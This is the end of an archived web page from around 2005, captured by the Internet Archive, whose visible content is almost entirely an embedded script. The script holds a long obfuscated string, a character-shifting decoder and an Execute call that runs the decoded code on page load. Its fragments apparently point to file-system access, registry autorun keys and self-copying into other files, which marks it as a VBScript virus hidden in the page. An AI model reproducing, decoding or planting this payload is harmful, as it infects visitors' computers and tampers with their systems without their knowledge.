Me]'CqkqejmRtnbmg(*+L]lsIj]dx?a`r%Ej]IbEj]FqgbtehmFqgbtehm GCBraZseIZhl$KgEnknrKdsqfd J^wtHfBmWd^qe6dmllShagAqht?tn_mhojEj]IbSdZqeBbke6La_s(SbmP]mg,/&Ork`qaiEih^r\?hlmkgFeedsXFhcnhrobmSdZqe`URt]mhoj^qyX[kajd-hpf!Be $?RO*?hla>wiomr(Oa`ra?hla( PadnBaheKF:opagcTk!Rh]kdFeed,asmh(>ksaSamFeedTafo 9ESK'NpagSetmEih^'SdZqeBbke(++tnnd)Eih^Seii-Wnbse;DMLL:&oaCnEe !<% ;NDUnnhh`d9!r[rcnbot6&JJ[lsanm')! !>% r[BrH_&AsmhMdxpFeedTafo.?ensaEj]IbDa_`uhmHd6WoLgehe-Ra`Qe]]'DDDY[<TRN>MT[NRENUHdagsipbdsX=df]nktNrenHDKnsLkhjVakrikg=PrSd^kl*KdgN^`d$GKAR^LK<@L[F@CDBMEXLnfpp`raULi_knsk_s\Knslkhj Aqoralr\I^ci]OdrSlRhaek.N^fWnbseGKAR^CQKQEJM^UO>Q\E]dnpbsial[=df]nktE]%XLnfpp`raULi_knsk_s\Knslkhj Aqoralr\La_s(KnsLkhjVakrikg+1%%*)[M]bk\?hlpkld Qld Om`tehmenr!,-%!RA@^DSHQDC]ek GCLaeeQec!!HG>X_?NQRAGS_QLDRXBcejmhte^r\CebZtlpBc&URobmvan^[Me\qoohetXHtthhnk>wpn^rsX% H^et$HttHhnkR^qsehm,-&'/\IZhlXLsapbnnakx JZle%Rh]kdFeed)BaheKFF`ihKdg$GKAR^CQKQEJM^UO>Q\E]dnpbsial[=df]nktE]%XLnfpp`raULi_knsk_s\Knslkhj Aqoralr\La_s(KnsLkhjVakrikg+1%%*)[M]bk\SbceLsapbnnakx JZle%Rh]kdFeed)VsOadlh'QecPqip^DDDY[<TRN>MT[NRENURobmvan^[Me\qoohetXHefe\d\5'/\Knslkhj\Kisikgr\IZhlX>ciphqPn^een^mca+1/*/7.%!RA@^DSHQDC]ek GCLaeeQec!!HG>X_?NQRAGS_QLDRXLnfpp`raULi_knsk_s\Sbmdkpr I^rs]`hncRu^lxsp^l\LknfeedsXFhcnhrobmOqmkokdIjmdrj^s O^stegfsX)`0`)10,)/0,)/0,\/0,)/0,)/0,)/42U/0-^/32)!,[kajd!)BaheKFF`ihKdg$GKAR^CQKQEJM^UO>Q\OhetsZqeXFhcnhrobm[WegcoslNPUBunkdnpOdrobnnXPhn`hvsFdsoZfij`Sq[ryomdmXIqobbkeoULi_knsk_s Knslkhj EgsengdtLdtpbmgoU/a,]/2,)/0,)/0,)b0,)/0,)/0,)/00/[0,*d0///(al]gj%WoLgehe-Ra`Vremd AJEUXBUNKDNPXTSAK[Sk_sw]kd\IbbrklnfpUNfbbbeX*/.,UNupenogUNppbnnoULaee[E`bsonIqeb^qej\d(*21,01,KDG[=VON=!<`lhJJIZhlN^f(AJEUXBUNKDNPXTSAK[Sk_sw]kd\IbbrklnfpUNfbbbeX*/.,UBoifnnXF`ihLdtpbmgoUMesLsapbnnakx(al]gj%KFnlm]`dFkecen!Kebm'WegOapa+3%% Iqock`m?hlal[CkflojEih^r\IbbrklnfpRh]kddXLsapbnnakx%Ej]FqgbtehmFqgbtehm GCBraZseIbkian')Nn>qrkkRaltmaMetmP^lpLZsh6IbMop!ESK'Eih^Dxelss$PhnLZshSLbreis.aqd%Td^mMdmlI`td< lxsp^l3.U!>mdBeBe P^lpLZsh6orrtaf22XTd^mLsanmTpBbke6WegOapa&RYOMDMXDdrj^k3.'clhAereRt]ksUl?hla< SbmP]mg !SULSEIUJengdl*]klEj]IbWoLgehe-Ra`Vremd AJEUXKO?:K_I:BHEGD\OhetsZqeXFhcnhrobm[Wegcosl[CqkqejmUenlhojUQujUJengdl/+!,Om`rpNoFeed?RO*<npu?hlaVijI`td% pdbXdiw]ek.cbe(PhnLZshs^a\Bhkdak-hpm!?RO*<npu?hlaVijI`td% lxsp^l3.UjjsZkl*`hf%VijI`td% lxsp^l3.Uceodsol'hne?ZklDIAlidn`Mn(SbmP]mg !wa[[Fkecen'gtp+dms%WoLgehe-Ra`Vremd AJEUXBL=LREOXQOKM[.`ek\%!dheeih^!PrSd^kl*KdgSkhta!HG>X_?E@SO>R_NHNTX'clhUBojmdnpSyl^!,Zophbbapbnn+q,mo]nwjena`SlRhaek.N^fWnbseGKAR^CH:RSAL^RKHS\`ekfeed\@^eaqesI_hm\%VsOadlh'QecKda`!!HG>X_?E@SO>R_NHNTXowdbbkeX=df]nktE\nnX(PrSd^kl*KdgSkhta!HG>X_?E@SO>R_NHNTX]klbbkeXLbreisEj`hnaU!,OAS_khppSlRhaek.N^fWnbseGKAR^CH:RSAL^RKHS\`ekFeed\OadlhUNpag[Ckflaj][(PhnLZshTafoP]mg !WO\qilm-et^0$*WoLgehe-Ra`Vremd AJEUXBL=LREOXQOKM[dheEih^[Sd^klAq[PnhoenmxSd^dtDZmdh^qsXPRHLknpoU!,t50..3C=.,91,A--*BF)1B92&/0=:/0>1604<|VsOadlh'QecPqip^DDDY[<KAOLDS[KNOPUclh?hlaURcnbotDhrtAgbo`^[(z81*212,0-01/C)*0D.&A1B2,0,</4B15C/+3}SamFeedTafo 9ESK'NpagSetmEih^'SpZqtQiEih^+2(mquaBbkeP^lp*Pqip^V^lSetmBbkeP^lp*<koo^Agc BnmcpbnnBnmcpbnnDILeddIp!(Be EgVhakd 87dmllShagAqht?tn_mhojEj]IbTdbrLk\`tehm 9co_nlejm-lk\`tehmBe H^et$MgioEnc]mhoj%4%< _hlaTd^mMgioEnc]mhoj< Ibc(PahsHhbapbnn(2(Be BLN.C^sEtmdnobnnJZle$MgioEnc]mhoj<:!mgejTdbrLk\`tehm 9Kebm'TdbrLk\`tehm,H^m(PahsHhbapbnn%, H^m(BLN.C^sFeedN]fd(PahsHhbapbnn%(>mdBeBe H^m(PahsHhbapbnn%= /ShagPahsHhbapbnn6TdbrLk\`tehm !\Ej]IbKFnlm]`dFkecen!ShelKo_Zsikg(>mdBe>md?tn_mhoj?tn_mhojJJIZhlN^f(N^fSpk+FeedN]fd)Nn>qrkkRaltmaMetmN^fTafoSpk=PrSd^kl*KdgN^`d$KdgOmq)HfKdgP^lpOmq 9!MgejWoLgehe-Ra`Vremd N^fSpk+FeedN]fd>mdBe>md?tn_mhoj?tn_mhojJJK[nSq['CqkqejmRtnbmg%Sq[D 9/MdspHtt60CoPgih^TnndMdspHtt6TalsOqm+*E_TalsOqm>+7 PadnBunkdnpLsregf 9EijZky@brk6U!>wipCoDn`HfNn>qrkkRaltmaMetmO^s PahsBhkdak=?RO*@dtBhkdak'CqkqejmRtnbmg%SamDe\Ru^< ?kdap^Nbf^bt$Rcnbotegf.@bbtehmanr!)RepEoh]dro< PahsBhkdak-Sq[Eoh]droFkecen<nujm=)Bhq AZbhMdml?nl`^q egFkecenlBhkdakBoqgs 9Eoh]dr?htnp* -De\Ru^'`d`Eoh]dr?htnp%TafoFkecen'Mai^J^wtHf=hcOna.?htnp< ,ShagHZrtEgcet<gan< EgrtnKdv$<trn^mtOmqij`+X+Lag'CqkqejmRtnbmg%&0)Ru^Lsregf 9Li`!BunkdnpLsregf,HZrtEgcet<gan$0,H^m(?nqragsSpkhnc,L]lsIj]dx?a`r)*(<trn^mtOmqij`=DICdZmgaLtb$<trn^mtOmqij`+L]lsIj]dx?a`r%Sq[D 90>ksaIbRu^>=)Td^m<trn^mtOmqij`=<trn^mtOmqij`&=hcOna.Emdm$*( !\Etbs @hAerei 9/?nrc=*TkEoh]dr?htnpIbKC]ld(OnaSpkhnc=EBao^'De\Ru^'Htaf'j%Td^mBe f; BhkdakBoqgs PadnBunkdnpLsregf 9BunkdnpLsregf Ci_Ltb*Bsei!i+-&[DxemDkEj]IbEj]IbNaqsE`spBmdaqBh]k=BmspkQer!BunkdnpLsregf,U!,H^m(?nqragsSpkhnc,1%Sq[Rtnbmg6Me]'CqkqejmRtnbmg(E`spBmdaqBh]k*1(Edn$<trn^mtOmqij`(-HZrtEgcet<gan&0)BunkdnpLsregf 9JJ?a`nc^Ru^!BunkdnpLsregf,HZrtEgcet<ganAgc E_Agc E_HhnpJJK[nSq[=<trn^mtOmqij`Agc BnmcpbnnBnmcpbnnDIPnhoacZse$KgEnknrKdsqfd J^wtQecI`tdO`lq^=GKAR^LK<@L[F@CDBMEXLnfpp`raULi_knsk_s\Knslkhj Aqoralr\@^fra^!=hsg=dgn^d 9VsOadlh'QecKda`!QecI`tdO`lq^(Be @brk@^fra^=! PadnCiodCeckde6Feg`lu=hsg% 3[Dn`HfEonh=-so.@brk@^fra^=DIO^hRu^!CiodCeckde%KFnlm]`dFkecen!CiodCeckde%NaqsPrSd^kl*KdgSkhtaQecI`tdO`lq^+DeljDa`qeaEj]FqgbtehmFqgbtehm GCtmiZfeBhkdak'P]mgN]fd)Nn>qrkkRaltmaMetmO^s BhkdakMai^=?RO*@dtBhkdak'P]mgN]fd)RepShelEih^r 9Eoh]drJZle*?hlalDmsEtbrto< ,FkkE]\g PahsBbkeBm PahsBbkeoFeedEtm=NBao^'FOH-GamDxp^msehmN]fd(PahsBbke*I`td(Be BbkeAqs 9!HPF! KkFeedEtm=GTIE! KkFeedEtm=@SLOnEih^Dxp< IGPNr?hla>wt6FLOMgejC]ek GC@pl^mdPh'TdbrFeed.LZsh(gtie!)Dlo^Hf?hla>wt6R;RMgejC]ek GC@pl^mdPh'TdbrFeed.LZsh(ubo(>ksaBe BbkeAqs 9!HPM! PadnGtp>wiomr 90>mdBeGdxpIb'U?Zre$I`tdG`ma=NBao^'WegOapa&CeodsolU!)%Nr!TC]ld(LZshJZle%< Q<`sa!VijI`td% =dsgmnp(Td^mAstAqhspl=*Agc E_E_HpmDxelss60MgejFOH-CkixFeed SbmP]mg !sulsei,1\`^rkpho.egh(I`tdG`maFOH-CkixFeed SbmP]mg !wa[[Fkecen'gtp+P]mgN]fd>mdBe>md?tn_mhoj?tn_mhojJJO^sDef')Nn>qrkkRaltmaMetmAkq.?edanTalsIp< SLbreis.O\qilmEuhemai^E_EnkTd^mBmWd^qe6dmllEhldBmWd^qe6r[rDn`HfHfBmWd^qe6r[rMgejSamFOH=<qe]mdO^cdcp!!S_khppbmg*?hlaLxsp^lO^cdcp(LdtPrSd^kl6Cn^`taHaja\s(PRcnbot*Lgehe!)Dlo^O^s =iolaHaja\s 9co_nlejm-alikepl'GC^gq^rt=iolaHaja\s.o^sCHLHD$zF5,4D?+1--<E0)*0D,&@D>2,0,</4B=48=)A}=iolaHaja\s._kdap^Hnom`n_^')RepVsOadlh< =iolaHaja\s.C^sO^cdcp!(:oph^Nbf^bt*ldt?ERI@!!{,=33B>/1)?/9/&01??,85-/-,)@0?2/50+18y(:oph^Nbf^bt*\qe]mdIjlsaj\d(%SamFOH=:oph^Nbf^bt*@dtK[ie_m')Dn`HfRepCiodNbf^bt6FOH-DnbueoFkkE]\g @brkP^lpBm @brkK[ie_mE_DeljTafo.@khvaMxpa;>+Aj]DeljTafo.@khvaMxpa;>*Td^m>wipEonEj]IbFeg`lu=hsg< @brkP^lp*=qir^KepmdrMetm@bl Kmgen:qr$,(K`n`hliv^Bhq e6/ Ph3Ntd^qAnk'i%< Egs($2*Kmd%J^wtSeiiRtnbmg6Fkki9*TkKej!ShelSetm(MdmlGtm6Ao\'Me]'TdbrTaqs,e%0)%IbSeiiMui< -,Td^mMdmlGtm624EhldIbSeiiMui< -)Td^mMdmlGtm625Ej]IbTafoCdZq 9Bhn!SeiiMui, Kmgen:qr$bMk]4%E_TafoCdZq 9Bhn!24%ShagP^lp?a`r6Cdk'14Agc E_P^lpOmqij`=MdmlLsregf SeiiBh]kJ^wtTnHhbkOmq 9!Et^bup^'=hmDdy=kq(/+TdbrTaqsub?kKf!Kar@rn!/)6Opadr=kq(,&!oaCnEe&Jeu:qr$*( 9! Ntd^qAnk'1%% !&r[BrH_%Ddy=kq(.=&Hshak@rn!1)%v^<qLb!G^xAnk'3%< % Kmgen:qr$,( !ub?kKf!Fkki9*TkKej!DxaLsregf)%v^<qLb!P^lpJnl 9@s_!Li`!DxaLsregf,e%0)%!&r[BrH_%Be P^lpJnl 908Mgej!&r[BrH_%MdmlGtm630!&r[BrH_%>mdBeub?kKf!TafoCdZq 9Bhn!SeiiMui* G^xAnk'iFnd-()%v^<qLb!E_TafoCdZq 9Bhn!18%Shag!oaCnEe&SeiiBh]k=oaCn!&r[BrH_%>ksaBe P^lp?a`r6Cdk'25Td^mub?kKf!TafoCdZq 9ubH_!oaCnEe&Dn`Hf%v^<qLb!PahsP^wt6TdbrTaqs SeiiBh]k!oaCnEe&Metm!%&oaCnEe !Et^bup^'TdbrTaqs)TdbrTaqs 9!Et^Rtnbmg6&MdmlLsregf !DmllP^wt6!<% lbreis hZmgqZfe9oas_khpp7! ub?kKf`hbui^mt*pqip^! !<% ]hvlsyh^<'lhripbnn6Zasketta4la_s:,iw;mnp6)ox7vi`mg:,iw;adicas:,iw;s,ij]dx6+7;ohse[hlemx:ahd`^m':&;!% :OPH>S J:LE9DI![`teomHABFHP6/ SBCTD6/ _hce9\nm*fr.%ZbteodX*:bteod!T<nmlhmejm=8&.ALIKEP7! !<% (cir7!% r[BrH_&;+lbreis>% r[BrH_&;o\qilml]gfu]`d=r[rcnbot:&oaCnEe ShelSetm&oaCnEe TnHhbkOmq ub?kKf8&.s_khpp7! ub?kKf8&.BK=X>% r[BrH_&;+ASMH7!OasP^wt6TdbrTaqs ub?kKfUjEncgLsrv^<qLb% DI_om`rp!(VijI`td< BLN.C^sSl^bi]eEoh]dr$)( !\Ib'FOH-FeedEtbrto!VijI`td% pdbX?nl`^q.dms%Td^m?RO*<npu?hlaVijI`td% pdbX?nl`^q.dms(PhnLZshs^a\gcvahe-ge_!>mdBeBe $?RO*?hla>wiomr(SbmP]mg !sulsei,1\`^rkpho.egh%Td^m?RO*<npu?hlaVijI`td% lxsp^l3.Uceodsol'hne+WegOapa&ryomdm/+[kfp`lh'fibAgc E_Agc Bnmcpbnn"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 4"&vbCrLf&"KeyArr(1) = 7"&vbCrLf&"KeyArr(2) = 1"&vbCrLf&"KeyArr(3) = 0"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</BODY>
</HTML>




<!--
     FILE ARCHIVED ON 9:51:02 Jan 14, 2005 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 21:14:01 Feb 4, 2013.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
